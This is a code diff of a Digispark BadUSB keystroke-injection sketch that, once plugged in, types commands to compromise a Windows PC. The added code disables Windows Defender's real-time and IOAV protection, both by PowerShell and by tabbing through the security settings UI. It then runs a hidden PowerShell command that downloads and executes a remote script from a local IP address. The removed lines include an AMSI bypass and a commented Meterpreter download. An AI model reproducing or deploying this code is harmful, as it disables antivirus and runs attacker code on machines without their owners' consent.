@@ -23,75 +23,71 @@ void digiEnd() {
   }
 }
 
-/* ------------- main ------------- */
-
-void setup() {
-  digiBegin();
-
-  DigiKeyboard.delay(3000);
-
-  // Enter cmd as Administrator
+void startCmd() {
   DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
   DigiKeyboard.delay(250);
   DigiKeyboard.print("cmd Start-Process powershell -Verb runAs");
   DigiKeyboard.delay(200);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(1000);
-  DigiKeyboard.sendKeyStroke(KEY_Y,MOD_ALT_LEFT);  
-  DigiKeyboard.delay(1000);
-  // bypass UAC prompts
+  DigiKeyboard.delay(1000); 
+}
 
-  // cd %userprofile%
-  DigiKeyboard.print("cd %userprofile%");
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(100);
-  
-  // Removes all security definitions for windows defender and disables AV protection
-  DigiKeyboard.print("\"%ProgramFiles%\\Windows Defender\\MpCmdRun.exe\" -RemoveDefinitions -All Set-MpPreference -DisableIOAVProtection $true");
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(100);
-
-  // powershell
+void disableAV() {
   DigiKeyboard.print("powershell");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(2500);
-  
-  // Disables defender's 'real time monitoring' and sets exclusion path in event defender conducts a scan
-  // ;Add-MpPreference -ExclusionPath \"<define exclusion path here>\"
+  DigiKeyboard.delay(500);  
+  DigiKeyboard.print("Set-MpPreference -DisableIOAVProtection $true");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(1000);
   DigiKeyboard.print("Set-MpPreference -DisableRealtimeMonitoring $true");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(100);
-  
-  // One line AMSI bypass (courtesy of Matt Graeber)
-  DigiKeyboard.print("\"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\"");
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(100);
+}
 
-  // Download meterpreter Payload 
-  // DigiKeyboard.print("iex (New-Object System.Net.WebClient).DownloadFile('http://<ipaddr>/<payload>','<path\\to\\payload>');Start-Process .\\\"<path\\to\\payload>\"\\");
-  // DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  // DigiKeyboard.delay(100);
-
-  // Exit Powershell
-  DigiKeyboard.print("exit");
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+void disableAV_TAB() {
   DigiKeyboard.delay(1000);
-
-  // exit
-  DigiKeyboard.print("exit");
+  DigiKeyboard.sendKeyStroke(KEY_Q, MOD_GUI_LEFT);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.print("virus & threat protection");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(3000);
+  DigiKeyboard.sendKeyStroke(KEY_TAB);
+  DigiKeyboard.sendKeyStroke(KEY_TAB);
+  DigiKeyboard.sendKeyStroke(KEY_TAB);
+  DigiKeyboard.sendKeyStroke(KEY_TAB);
+  DigiKeyboard.delay(200);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(200);
+  DigiKeyboard.sendKeyStroke(KEY_SPACE);
+  DigiKeyboard.delay(2000);
+  DigiKeyboard.sendKeyStroke(KEY_Y,MOD_ALT_LEFT);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);
+  DigiKeyboard.delay(500);
+  
+}
 
-  // Execute Payload
+void executePayload() {
+  DigiKeyboard.delay(100);
   DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
   DigiKeyboard.delay(500);
   DigiKeyboard.print("powershell -ExecutionPolicy Bypass -NoLogo -NoProfile -WindowStyle Hidden (New-Object system.net.webclient).downloadstring('http://192.168.1.102/download_cradle.ps1') | IEX");
   DigiKeyboard.delay(200);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(300);
+}
+
+/* ------------- main ------------- */
+
+void setup() {
+  digiBegin();
+  
+  disableAV_TAB();
+
+  executePayload();
   
   digiEnd();
 }
 
 void loop() {
-  /* empty */  
 }
